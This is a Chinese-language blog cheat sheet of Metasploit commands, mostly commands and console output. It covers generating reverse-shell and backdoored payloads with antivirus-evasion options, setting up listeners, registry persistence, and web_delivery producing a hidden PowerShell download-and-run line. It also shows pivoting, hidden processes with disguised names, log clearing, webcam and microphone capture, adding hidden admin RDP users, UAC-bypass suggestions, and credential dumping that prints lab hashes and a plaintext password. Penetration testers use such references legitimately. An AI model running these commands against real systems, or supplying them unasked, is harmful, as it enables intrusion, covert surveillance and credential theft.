---
layout: post
title: Metasploit 常用指令
category: Linux
tags: [msf]
---

## Quick install

MSF (Metasploit Framework) 一键安装，以下脚本调用将导入 Rapid7 签名密钥并为支持的 Linux 和 macOS 系统设置程序包：

```shell
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
  chmod 755 msfinstall && \
  ./msfinstall
```

[Viper](https://github.com/FunnyWolf/Viper) 一键安装：

```shell
sysctl -w vm.max_map_count=262144
curl -o f8x https://f8x.io/   # wget -O f8x https://f8x.io/
bash f8x -viper
```

armitage 使用（MSF GUI 客户端）：

```
┌──(root㉿kali)-[~]
└─# apt install armitage

┌──(root㉿kali)-[~]
└─# service postgresql start

┌──(root㉿kali)-[~]
└─# armitage
```

## Generate Payload

显示可以使用的 payloads：`msfvenom --list payloads`（使用 `--payload-options` 参数，可查看 payload 的配置选项）

一般生成 payload 的命令格式：

```
msfvenom -p <os>/<arch_x64>/<shell_type_meterpreter>/<reverse_shell_protocol> lhost=<atk_ip> lport=<atk_port> -f <output_format> -o <generated_payload_filename>
```

其它参数：

| 参数名 | 简述                                                                             |
| ------ | -------------------------------------------------------------------------------- |
| -f     | 输出格式（msfvenom --list formats 查看支持的输出格式）                           |
| -b     | 指定生成的 payload 中要避免的字符（用于免杀）                                    |
| -e     | 指定使用的编码器（用于免杀）                                                     |
| -i     | 对 payload 进行编码（-e）的次数                                                  |
| -x     | 指定自定义可执行文件作为模板（用于植入后门到正常软件，可能导致无法正常执行软件） |

生成 payload 命令示例：

```
---------- Operating System Payloads

# windows_x64_bind_tcp
msfvenom -p windows/x64/meterpreter/bind_tcp lport=4444 -f exe -o bindshell.exe

# windows_x64
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<atk_ip> lport=<atk_port> -f exe -o shell.exe

# linux_x64
msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=<atk_ip> lport=<atk_port> -f elf -o shell

# mac_x64
msfvenom -p osx/x64/meterpreter/reverse_tcp lhost=<atk_ip> lport=<atk_port> -f macho -o shell

# android
msfvenom -p android/meterpreter/reverse_tcp lhost=<atk_ip> lport=<atk_port> -o payload.apk

---------- Web Payloads

# php
msfvenom -p php/meterpreter_reverse_tcp lhost=<atk_ip> lport=<atk_port> -f raw > shell.php
cat shell.php | pbcopy && echo ' shell.php && pbpaste >> shell.php

# jsp
msfvenom -p java/jsp_shell_reverse_tcp lhost=<atk_ip> lport=<atk_port> -f raw > shell.jsp

# asp
msfvenom -p windows/meterpreter/reverse_tcp lhost=<atk_ip> lport=<atk_port> -f asp > shell.asp

# war (Web application ARchive)
msfvenom -p java/jsp_shell_reverse_tcp lhost=<atk_ip> lport=<atk_port> -f war -o shell.war

# jar (Java archive)
msfvenom ‐p java/meterpreter/reverse_tcp lhost=<atk_ip> lport=<atk_port> ‐f jar -o shell.jar

---------- Scripting Payloads

# python
msfvenom -p cmd/unix/reverse_python lhost=<atk_ip> lport=<atk_port> -f raw > shell.py

# bash
msfvenom -p cmd/unix/reverse_bash lhost=<atk_ip> lport=<atk_port> -f raw > shell.sh

# perl
msfvenom -p cmd/unix/reverse_perl lhost=<atk_ip> lport=<atk_port> -f raw > shell.pl
```

生成对应编程语言的 shellcode，只需更改 `-f` 参数即可，如：raw、java、py、c 等。使用 `--list formats` 可查看支持的格式。使用 `--list payloads` 可查看支持的 payload 的种类。

---

## Msfconsole

### 创建监听（Create Listener）

在 msf 控制台中，提供了更加便捷，快速建立监听的方式：

```console
msf6 > handler -H <atk_ip> -P 4444 -p windows/x64/meterpreter/reverse_tcp
[*] Payload handler running as background job 1.
[*] Started reverse TCP handler on atk_ip:4444

msf6 > jobs

Jobs
====

  Id  Name                    Payload                              Payload opts
  --  ----                    -------                              ------------
  1   Exploit: multi/handler  windows/x64/meterpreter/reverse_tcp  tcp://atk_ip:4444

msf6 >
```

一般情况设置监听：

```console
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost <atk_ip>
lhost => <atk_ip>
msf6 exploit(multi/handler) > set lport 4444
lport => 4444
msf6 exploit(multi/handler) > set ExitOnSession false
ExitOnSession => false
msf6 exploit(multi/handler) > set SessionExpirationTimeout 0
SessionExpirationTimeout => 0
msf6 exploit(multi/handler) > exploit -j -z
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 0.0.0.0:4444
msf6 exploit(multi/handler) >
```

| 配置命令                          | 简述                                                                                  |
| --------------------------------- | ------------------------------------------------------------------------------------- |
| exploit -j -z                     | 在后台持续监听。-j 创建后台任务，-z 接收到 shell 后不自动进入到会话中。               |
| setg                              | 设置全局变量，这样切换模块就不需要再进行设置了                                        |
| unsetg                            | 命令取消设置全局变量                                                                  |
| show info                         | 查看当前模块的基本信息                                                                |
| show advanced                     | 查看当前模块和 payload 的高级配置信息                                                 |
| set ExitOnSession false           | 在接收到 seesion 后继续监听端口，保持侦听。防止假死与假 session（刚连接就断开）       |
| set SessionCommunicationTimeout 0 | 默认一个会话在 5 分钟（300 秒）没有任何活动，它会被杀掉，为防止此情况可将此项修改为 0 |
| set SessionExpirationTimeout 0    | 默认一个星期（604800 秒）会话将被强制关闭，修改为 0 后将不会自动关闭。                |
| set AutoRunScript                 | 在会话创建时自动运行的脚本                                                            |

可以通过设置 AutoRunScript 在接收到 shell 后，自动进行权限维持：

```console
msf6 exploit(multi/handler) > set AutoRunScript exploit/windows/local/persistence
AutoRunScript => exploit/windows/local/persistence
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on atk_ip:4444
[*] Sending stage (200774 bytes) to xx.xx.xx.xx
[*] Session ID 2 (atk_ip:4444 -> xx.xx.xx.xx:25452) processing AutoRunScript 'exploit/windows/local/persistence'
[-] Handler failed to bind to atk_ip:4444:-  -
[-] Handler failed to bind to 0.0.0.0:4444:-  -
[*] Running persistent module against DESKTOP-TEST via session ID: 2
[+] Persistent VBS script written on DESKTOP-TEST to C:\Users\test\AppData\Local\Temp\wWdKedhW.vbs
[*] Installing as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\aSyvDKvC
[+] Installed autorun on DESKTOP-TEST as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\aSyvDKvC
[*] Clean up Meterpreter RC file: /home/kali/.msf4/logs/persistence/DESKTOP-TEST_20230517.3540/DESKTOP-TEST_20230517.3540.rc

[*] Meterpreter session 2 opened (atk_ip:4444 -> xx.xx.xx.xx:25452) at 2023-05-17 22:35:47 +0800

meterpreter >
```

### 接收反弹 shell（Receive Reverse Shell）

```console
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload linux/x64/shell_reverse_tcp
payload => linux/x64/shell_reverse_tcp
msf6 exploit(multi/handler) > set lhost <atk_vps_ip>
lhost => <atk_vps_ip>
msf6 exploit(multi/handler) > set lport 4444
lport => 4444
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on <atk_vps_ip>:4444
[*] Command shell session 1 opened (<atk_vps_ip>:4444 -> <target_ip>:41286) at 2023-07-19 21:38:00 +0800
```

接收到一个普通的 bash shell，与 nc 接收的并没有区别，我们可以将其提升为功能更加强大的 meterpreter 会话，以便我们进行其它操作。

先使用 `ctrl+z` 或输入 `background` 可选择将普通 session 放入后台，再使用 `use post/multi/manage/shell_to_meterpreter` 模块获得一个新的 meterpreter 会话：

```console
root@ubuntu:/# background

Background session 1? [y/N]  y
msf6 exploit(multi/handler) > use post/multi/manage/shell_to_meterpreter
msf6 post(multi/manage/shell_to_meterpreter) > set session 1
session => 1
msf6 post(multi/manage/shell_to_meterpreter) > run

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on lhost.ll.ll.ll:4433
[*] Sending stage (1017704 bytes) to rhost.rr.rr.rr
[*] Command stager progress: 100.00% (773/773 bytes)
[*] Post module execution completed
msf6 post(multi/manage/shell_to_meterpreter) > sessions 2
[*] Starting interaction with 2...

meterpreter >
```

使用 `sessions -u <id>` 可以快捷的从 shell 会话派生一个新的 meterpreter 会话：

```console
msf6 exploit(multi/handler) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on atk_vps_ip:4433
[*] Sending stage (1017704 bytes) to rhost_ip
[*] Command stager progress: 100.00% (773/773 bytes)
[*] Post module execution completed
msf6 post(multi/manage/shell_to_meterpreter) > sessions 2
[*] Starting interaction with 2...

meterpreter >
```

### Web Delivery

web_delivery 模块会在本地开一个 web 服务，并返回一条命令，在目标机器上执行该命令后，目标机就会从攻击机的 web 服务下载并执行 payload：

```console
msf6 > use exploit/multi/script/web_delivery
[*] Using configured payload python/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > show targets

Exploit targets:
=================

    Id  Name
    --  ----
=>  0   Python
    1   PHP
    2   PSH
    3   Regsvr32
    4   pubprn
    5   SyncAppvPublishingServer
    6   PSH (Binary)
    7   Linux
    8   Mac OS X


msf6 exploit(multi/script/web_delivery) > set target 2
target => 2
msf6 exploit(multi/script/web_delivery) > set payload windows/x64/meterpreter/bind_tcp
payload => windows/x64/meterpreter/bind_tcp
msf6 exploit(multi/script/web_delivery) > set rhost <target_ip>
rhost => <target_ip>
msf6 exploit(multi/script/web_delivery) > set srvport <atk_port>
srvport => <atk_port>
msf6 exploit(multi/script/web_delivery) > run
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/script/web_delivery) >
[*] Using URL: http://atk_ip:8080/H7qVGtWny9jm
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQB......kAKQA7AA==

msf6 exploit(multi/script/web_delivery) > jobs

Jobs
====

  Id  Name                                Payload                           Payload opts
  --  ----                                -------                           ------------
  1   Exploit: multi/script/web_delivery  windows/x64/meterpreter/bind_tcp

msf6 exploit(multi/script/web_delivery) >
[*] xx.xx.xx.xx     web_delivery - Delivering Payload (3744 bytes)
[*] xx.xx.xx.xx     web_delivery - Delivering AMSI Bypass (1387 bytes)
[*] xx.xx.xx.xx     web_delivery - Delivering Payload (3744 bytes)

msf6 exploit(multi/script/web_delivery) > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) >  set payload windows/x64/meterpreter/bind_tcp
payload => windows/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > set rhost <target_ip>
rhost => <target_ip>
msf6 exploit(multi/handler) > run

[*] Started bind TCP handler against <target_ip>:4444
[*] Sending stage (200774 bytes) to <target_ip>
[*] Meterpreter session 1 opened (<atk_ip>:45021 -> <target_ip>:4444) at 2023-05-20 09:44:53 +0800

meterpreter > getuid
Server username: DESKTOP-TEST\test
meterpreter >
```

### MSF 派生会话至 CS

首先在 CS 上开启一个监听，正常开启一个 `Beacon HTTP` 即可。

MSF 将 payload 注入到某个进程的内存中，设置监听为 CS VPS 地址即可。

1. `use exploit/windows/local/payload_inject`
2. `set payload windows/x64/meterpreter/reverse_http` // 与 CS 监听器中相同
3. `set DisablePayloadHandler true` // 告诉 msf 已经有监听，不必再新建监听
4. `set lhost <cs_ip>`
5. `set lport <cs_port>`
6. `set session 1`
7. `run`

> 注：还可以使用 `set pid <pid>` 指定注入的进程。

在漏洞利用时，也可以将地址配置为 CS 的监听地址，直接在 CS 上生成会话（以 CVE-2019-2725 为例）

```
# 根据 CS 监听器选择对应的 payload
msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > set payload windows/meterpreter/reverse_http

# 设置回连地址（CS 监听器地址）
msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > set lhost CS_IP
msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > set lport CS_PORT

# 指定要执行的 meterpreter 会话
msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > set session 1

# 设置 MSF 不启动监听（不然 MSF 会提示执行成功，但没有会话建立，同时 CS 也不会接收到会话）
msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > set disablepayloadhandler true
```

## Meterpreter

部分内置命令：

| 命令              | 简述                                                      |
| ----------------- | --------------------------------------------------------- |
| route             | 显示路由信息                                              |
| arp               | 查看 arp 缓存                                             |
| getproxy          | 显示代理配置                                              |
| portfwd           | 端口转发                                                  |
| load -l           | 列出所有可用的扩展                                        |
| steal_token <pid> | 令牌窃取                                                  |
| migrate <pid>     | 会话迁移（migrate -N explorer.exe）                       |
| edit <file>       | 编辑文件                                                  |
| show_mount        | 列出所有挂载点（磁盘）                                    |
| clearev           | 清除日志                                                  |
| ……                | ……                                                        |
| idletime          | 查看机闲置时间                                            |
| enumdesktops      | 用户登录数                                                |
| screenshot        | 屏幕截取                                                  |
| screenshare       | 屏幕共享，实时监视目标用户桌面                            |
| record_mic        | 使用目标麦克风记录声音                                    |
| webcam_list       | 列出目标机器上的摄像头                                    |
| webcam_snap       | 摄像头拍照（webcam_snap -i 1 -v false 每隔 1 秒拍一次照） |
| webcam_stream     | 摄像头开启视频                                            |
| webcam_chat       | 视频聊天                                                  |

[内置脚本](https://www.offsec.com/metasploit-unleashed/existing-scripts/)：

| 使用命令    | 简述                                               |
| ----------- | -------------------------------------------------- |
| run scraper | 获取系统环境、哈希、注册表、服务、共享等。（推荐） |
| run winenum | 获取系统信息、用户信息，转储令牌等。               |

执行结果一般会保存在 `~/.msf4/logs/scripts/<module_name>/<target_timestamp>` 目录下。

### 文件操作

上传文件：

```console
meterpreter > upload /Stowaway_linux_x64_agent /home/neo4j
[*] Uploading  : /Stowaway_linux_x64_agent -> /home/neo4j/Stowaway_linux_x64_agent
[*] Uploaded -1.00 B of 1.43 MiB (0.0%): /Stowaway_linux_x64_agent -> /home/neo4j/Stowaway_linux_x64_agent
[*] Completed  : /Stowaway_linux_x64_agent -> /home/neo4j/Stowaway_linux_x64_agent
meterpreter >
```

下载文件：

```console
meterpreter > download "C:\\test.txt" /home/kali/Desktop/
[*] Downloading: C:\test.txt -> /home/kali/Desktop/test.txt
[*] Downloaded 13.00 B of 13.00 B (100.0%): C:\test.txt -> /home/kali/Desktop/test.txt
[*] Completed  : C:\test.txt -> /home/kali/Desktop/test.txt
meterpreter >
```

查看和删除文件：

```console
meterpreter > cat C:\\test.txt
test_file_1
meterpreter > del C:\\test.txt
meterpreter > cat C:\\test.txt
[-] stdapi_fs_stat: Operation failed: The system cannot find the file specified.
meterpreter >
```

### 命令执行

命令执行：

```console
meterpreter > execute -H -f chmod -a "777 /home/neo4j/Stowaway_linux_x64_agent"
Process 6531 created.
meterpreter > execute -H -f nohup -a "/home/neo4j/Stowaway_linux_x64_agent -c [vps_ip]:[vps_port] -s [conn_passwd] >/dev/null 2>&1 &"
Process 7984 created.
meterpreter >
```

| 参数                                                                              | 简述                                                                                              |
| --------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------- |
| -f                                                                                | 要运行的可执行命令                                                                                |
| -a                                                                                | 要传递给该命令的参数                                                                              |
| -H                                                                                | 创建隐藏的进程                                                                                    |
| -i                                                                                | 创建进程后与其交互                                                                                |
| -c                                                                                | 通道化 I/O（交互需要）。与 channel 命令一起使用，无需切换到单独的命令行界面，即可方便的查看输出。 |
| -m                                                                                | 支持直接从内存中执行攻击端的可执行文件                                                            |
| -d                                                                                | 在目标主机执行时显示的进程名称（用于伪装进程）                                                    |
| meterpreter > execute -H -m -d svchost.exe -f /home/kali/fscan64.exe -a "args..." |                                                                                                   |

命令执行并且使用 channel 指令读取回显：

```console
meterpreter > execute -c -f whoami
Process 21906 created.
Channel 8 created.
meterpreter > channel -r 8
Read 6 bytes from 8:

redis

meterpreter >
```

| 参数  | 简述           |
| ----- | -------------- |
| -c/-k | 关闭给定的通道 |
| -i    | 与给定通道交互 |
| -l    | 列出活动通道   |
| -r    | 从给定通道读取 |
| -w    | 写入给定通道   |

在 windows 的 meterpreter 中输入如下命令，加载 powershell 扩展并进入 powershell 交互模式：

```
load powershell
```

加载并执行 powershell 脚本：

```console
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_import /root/PowerView.ps1
[+] File successfully imported. No result was returned.
meterpreter > powershell_execute "Get-DomainComputer -TrustedToAuth -Properties samaccountname,msds-allowedtodelegateto"
[+] Command execution completed:
samaccountname msds-allowedtodelegateto
-------------- ------------------------
MSSQLSERVER$   {ldap/DC.xiaorang.lab/xiaorang.lab, ldap/DC.xiaorang.lab, ldap/DC, ldap/DC.xiaorang.lab/XIAORANG...}

meterpreter >
```

### 自动路由

> autoroute 后渗透模块通过 Meterpreter 会话创建新路由，使您能够更深入地进入目标网络。

从 meterpreter 提示符中使用：

```console
meterpreter > run post/multi/manage/autoroute
[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: windows
[*] Running module against WORK-7
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.10.10.0/255.255.255.0 from host's routing table.

# 经常自动路由会没路由到，可以手动添加路由
meterpreter > run post/multi/manage/autoroute -s 10.10.20.7/24
[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 10.10.20.7/255.255.255.0...
[+] Added route to 10.10.20.7/255.255.255.0 via 192.168.36.162
[*] Use the -p option to list all active routes

meterpreter > run post/multi/manage/autoroute CMD=add SUBNET=10.10.30.7 NETMASK=255.255.255.0
[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: windows
[*] Running module against WEBLOGIC
[*] Adding a route to 10.10.30.7/255.255.255.0...
[+] Route added to subnet 10.10.30.7/255.255.255.0.
```

添加了新路由后，我们可以通过 Pivot 运行更多模块。

```console
msf exploit(ms08_067_netapi) > use auxiliary/scanner/portscan/tcp
msf auxiliary(tcp) > set RHOSTS 192.168.218.0/24
RHOSTS => 192.168.218.0/24
msf auxiliary(tcp) > set THREADS 50
THREADS => 50
msf auxiliary(tcp) > set PORTS 445
PORTS => 445
msf auxiliary(tcp) > run

[*] Scanned 027 of 256 hosts (010% complete)
[*] Scanned 052 of 256 hosts (020% complete)
[*] Scanned 079 of 256 hosts (030% complete)
[*] Scanned 103 of 256 hosts (040% complete)
[*] Scanned 128 of 256 hosts (050% complete)
[*] 192.168.218.136:445 - TCP OPEN
[*] Scanned 154 of 256 hosts (060% complete)
[*] Scanned 180 of 256 hosts (070% complete)
[*] Scanned 210 of 256 hosts (082% complete)
[*] Scanned 232 of 256 hosts (090% complete)
[*] Scanned 256 of 256 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(tcp) >
```

### SOCKS 代理

在添加了 MSF 到目标机内网的路由后，可以将攻击机作为 SOCKS 代理服务器访问目标内网。

```console
msf6 auxiliary(scanner/portscan/tcp) > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVHOST MSF_VPS_IP
SRVHOST => MSF_VPS_IP
msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
SRVPORT => 1080
msf6 auxiliary(server/socks_proxy) > set username admin
username => admin
msf6 auxiliary(server/socks_proxy) > set password admin123
password => admin123
msf6 auxiliary(server/socks_proxy) > exploit -j
[*] Auxiliary module running as background job 1.
msf6 auxiliary(server/socks_proxy) >
[*] Starting the SOCKS proxy server
msf6 auxiliary(server/socks_proxy) > jobs

Jobs
====

  Id  Name                           Payload  Payload opts
  --  ----                           -------  ------------
  1   Auxiliary: server/socks_proxy

```

此时就可以使用 proxychains 等工具进行代理，攻击目标内网。

| 模块                         | SOCKS 服务版本 |
| ---------------------------- | -------------- |
| auxiliary/server/socks4a     | socks4         |
| auxiliary/server/socks_proxy | socks5         |

### 端口转发

```
Usage: portfwd [-h] [add | delete | list | flush] [args]


OPTIONS:

    -h   Help banner.
    -i   Index of the port forward entry to interact with (see the "list" command).
    -l   Forward: local port to listen on. Reverse: local port to connect to.
    -L   Forward: local host to listen on (optional). Reverse: local host to connect to.
    -p   Forward: remote port to connect to. Reverse: remote port to listen on.
    -r   Forward: remote host to connect to.
    -R   Indicates a reverse port forward.

```

将目标机的 3389 端口转发到攻击机的 1234 端口，转发后可以通过访问攻击机的 1234 端口访问到目标的 3389 端口：

```console
meterpreter > portfwd add -l 1234 -p 3389 -r <remote_ip>
[*] Forward TCP relay created: (local) :1234 -> (remote) <remote_ip>:3389
meterpreter > portfwd

Active Port Forwards
====================

   Index  Local           Remote        Direction
   -----  -----           ------        ---------
   1      127.0.0.1:3389  0.0.0.0:1234  Forward

1 total active port forwards.

meterpreter >
```

| 参数 | 简述                                                      |
| ---- | --------------------------------------------------------- |
| -i   | 要与之交互的端口转发条目的索引（请参阅“列表”命令）。      |
| -l   | 转发：要侦听的本地端口。 反向：要连接的本地端口。         |
| -L   | 转发：要侦听的本地主机（可选）。 反向：要连接的本地主机。 |
| -p   | 转发：要连接的远程端口。 反向：要侦听的远程端口。         |
| -r   | 转发：要连接的远程主机。                                  |
| -R   | 表示反向端口转发。                                        |

### 远程桌面

使用 `post/windows/manage/enable_rdp` 模块可以开启目标主机远程桌面登录服务，还可以方便的添加远程桌面登录用户。

```console
meterpreter > run post/windows/manage/enable_rdp

[*] Enabling Remote Desktop
[*]     RDP is already enabled
[*] Setting Terminal Services service startup mode
[*]     Terminal Services service is already set to auto
[*]     Opening port in local firewall if necessary
[*] For cleanup execute Meterpreter resource file: /home/kali/.msf4/loot/20230517192604_default_192.168.70.134_host.windows.cle_867157.txt

meterpreter > run post/windows/manage/enable_rdp username=admin password=admin123

[*] Enabling Remote Desktop
[*]     RDP is already enabled
[*] Setting Terminal Services service startup mode
[*]     Terminal Services service is already set to auto
[*]     Opening port in local firewall if necessary
[*] Setting user account for logon
[*]     Adding User: admin with Password: admin123
[*]     Adding User: admin to local group 'Remote Desktop Users'
[*]     Hiding user from Windows Login screen
[*]     Adding User: admin to local group 'Administrators'
[*] You can now login with the created user
[*] For cleanup execute Meterpreter resource file: /home/kali/.msf4/loot/20230517192626_default_192.168.70.134_host.windows.cle_327112.txt
meterpreter >
```

### 权限提升

在对主机进行提权的时候，可以使用 `run post/multi/recon/local_exploit_suggester` 模块，扫描包含在 msf 中的本地系统漏洞，显示目标可能易受攻击的本地漏洞利用列表，以及利用漏洞的可能性。（成功率并不高）

```console
meterpreter > run post/multi/recon/local_exploit_suggester Verbose=false ValidateArch=true ValidatePlatform=true

[*] 192.168.70.129 - Collecting local exploits for x64/windows...
[*] 192.168.70.129 - 184 exploit checks are being tried...
[+] 192.168.70.129 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
[+] 192.168.70.129 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 192.168.70.129 - exploit/windows/local/bypassuac_fodhelper: The target appears to be vulnerable.
[+] 192.168.70.129 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
[+] 192.168.70.129 - exploit/windows/local/bypassuac_sluihijack: The target appears to be vulnerable.
[+] 192.168.70.129 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[*] Running check method for exploit 43 / 43
[*] 192.168.70.129 - Valid modules for session 7:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_dotnet_profiler                Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/bypassuac_fodhelper                      Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/bypassuac_sdclt                          Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/bypassuac_sluihijack                     Yes                      The target appears to be vulnerable.
 6   exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/agnitum_outpost_acs                      No                       The target is not exploitable.
 8   exploit/windows/local/always_install_elevated                  No                       The target is not exploitable.
 9   exploit/windows/local/bits_ntlm_token_impersonation            No                       The check raised an exception.
 10  exploit/windows/local/canon_driver_privesc                     No                       The target is not exploitable. No Canon TR150 driver directory found
 11  exploit/windows/local/capcom_sys_exec                          No                       The target is not exploitable.
 12  exploit/windows/local/cve_2019_1458_wizardopium                No                       The target is not exploitable.
 13  exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   No                       The target is not exploitable. The build number of the target machine does not appear to be a vulnerable version!
 ......

meterpreter >
```

### 凭证转储

#### hashdump

获取本地用户哈希：

```console
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
test:1001:aad3b435b51404eeaad3b435b51404ee:0cb6948805f797bf2a82807973b89537:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:f0d8c96aa9cc58f05549e55e6b1f5c7f:::
```

#### mimikatz - kiwi

> 注：msf 中 mimikatz 扩展名已由 kiwi 代替。

加载 kiwi 模块，获取所有主机上的所有凭据：

```console
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username     Domain    NTLM                              SHA1
--------     ------    ----                              ----
XR-DESKTOP$  XIAORANG  b92f7d73c4c8999eec7b07d1b004c6e1  26c017bd796c3cfc272294ae4320cdb15cd5d47d
yangmei      XIAORANG  25e42ef4cc0ab6a8ff9e3edbbda91841  6b2838f81b57faed5d860adaf9401b0edb269a6f

wdigest credentials
===================

Username     Domain    Password
--------     ------    --------
(null)       (null)    (null)
XR-DESKTOP$  XIAORANG  e0 9c a5 18 fd 56 a7 eb e5 18 47 c0 a8 41 6e d7 90 bf 27 b5 99 c1 56 4e 00 92 b4 5d d9 82 d9 e8 c0 17 fa d6 02 f6 18 18 3b b7 96 30
                        57 3c 5b 17 53 ee e5 09 d2 23 8a 2e a2 62 e0 f3 f2 47 34 2e 79 0d 04 8b 78 c9 19 c8 92 d6 42 71 96 02 3b 8d 78 aa 4f 64 7a df 08 6
                       6 e3 05 1d 5e 94 54 13 b4 32 9e 32 0a 40 0e 1a 80 f5 23 b6 69 09 21 75 cd e3 44 b1 22 77 70 57 1b b9 d6 4c 8a e3 17 42 8c b7 58 85
                       29 03 7e d2 39 62 b2 1c 3e d6 74 70 06 f1 2a 4d 88 35 34 41 d5 94 5d fb f0 00 83 a5 b3 3c 00 78 36 97 66 a7 d5 bb 1f c0 c9 2b 08 5f
                        a4 c7 18 72 a6 ab 69 a2 ce 1e fe 43 ba d5 18 41 42 28 fd c4 be e1 7c c2 96 01 85 3c a3 14 11 e2 4f e0 16 3b 19 8b 36 eb aa 2c 27 f
                       3 42 a7 1b fc 29 f1 0a cc d7 c5 a0 b9 32 6e dc 8d c8 80 11 2d ce
yangmei      XIAORANG  xrihGHgoNZQ

kerberos credentials
====================

Username     Domain        Password
--------     ------        --------
(null)       (null)        (null)
xr-desktop$  XIAORANG.LAB  e0 9c a5 18 fd 56 a7 eb e5 18 47 c0 a8 41 6e d7 90 bf 27 b5 99 c1 56 4e 00 92 b4 5d d9 82 d9 e8 c0 17 fa d6 02 f6 18 18 3b b7 9
                           6 30 57 3c 5b 17 53 ee e5 09 d2 23 8a 2e a2 62 e0 f3 f2 47 34 2e 79 0d 04 8b 78 c9 19 c8 92 d6 42 71 96 02 3b 8d 78 aa 4f 64 7a
                            df 08 66 e3 05 1d 5e 94 54 13 b4 32 9e 32 0a 40 0e 1a 80 f5 23 b6 69 09 21 75 cd e3 44 b1 22 77 70 57 1b b9 d6 4c 8a e3 17 42
                           8c b7 58 85 29 03 7e d2 39 62 b2 1c 3e d6 74 70 06 f1 2a 4d 88 35 34 41 d5 94 5d fb f0 00 83 a5 b3 3c 00 78 36 97 66 a7 d5 bb 1
                           f c0 c9 2b 08 5f a4 c7 18 72 a6 ab 69 a2 ce 1e fe 43 ba d5 18 41 42 28 fd c4 be e1 7c c2 96 01 85 3c a3 14 11 e2 4f e0 16 3b 19
                            8b 36 eb aa 2c 27 f3 42 a7 1b fc 29 f1 0a cc d7 c5 a0 b9 32 6e dc 8d c8 80 11 2d ce
xr-desktop$  XIAORANG.LAB  (null)
yangmei      XIAORANG.LAB  xrihGHgoNZQ


meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:48f6da83eb89a4da8a1cc963b855a799:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
meterpreter >
```

| 命令                  | 简述                                                              |
| --------------------- | ----------------------------------------------------------------- |
| creds_all             | 检索所有凭据                                                      |
| creds_livessp         | 检索实时 SSP 凭证（查看当前使用的凭据）                           |
| creds_msv             | 检索 LM/NTLM 凭证                                                 |
| creds_kerberos        | 检索 Kerberos 凭证                                                |
| kerberos_ticket_list  | 列出所有 kerberos 票证                                            |
| kerberos_ticket_purge | 清除任何正在使用的 kerberos 票证                                  |
| kerberos_ticket_use   | 使用 kerberos 票证                                                |
